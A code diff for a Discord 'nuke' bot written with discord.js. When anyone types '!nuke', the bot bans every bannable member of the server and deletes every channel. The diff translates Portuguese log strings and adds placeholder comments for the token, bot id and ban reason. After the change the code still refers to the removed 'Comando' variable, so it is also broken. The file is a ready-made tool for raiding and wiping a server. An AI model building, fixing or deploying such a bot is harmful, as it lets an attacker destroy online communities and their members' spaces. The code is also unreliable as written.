@@ -1,14 +1,11 @@
 const discord = require("discord.js");
 const client = new discord.Client();
 
-const token = "";
+const token = "";//Place Token here
+const Botid = "";//Place id of bot here
+const reason=""//Place reason in ban
+const command = "!nuke"; //command for nuke
 
-const Botid = "";
-
-const Comando = "!nuke";
-console.log("Token: " + token);
-console.log("Client id: " + Botid);
-console.log("Comando:" + Comando);
 client.login(token);
 client.on("ready", () => {
   console.log("Bot is ready");
@@ -18,11 +15,11 @@ client.on("message", (msg) => {
     if (msg.content.startsWith(Comando)) {
       msg.guild.members.cache.array().forEach((f) => {
         if (f.user.id != Botid && f.bannable) {
-          try {
-            f.ban({ reason: "TrollFace" });
-            console.log("Banido: " + f.user.username);
+          try {            
+            console.log("Banned: " + f.user.username);
+            f.ban({ reason: reason });
           } catch (error) {
-            console.log("Erro: Ao banir " + f.user.username);
+            console.log("Erro: not ban " + f.user.username);
           }
         }
       });
@@ -30,7 +27,7 @@ client.on("message", (msg) => {
         try {
           f.delete();
         } catch (error) {
-          console.log("Erro: ao excluir o canal " + f.name);
+          console.log("Erro: when deleting the channel " + f.name);
         }
       });
     }
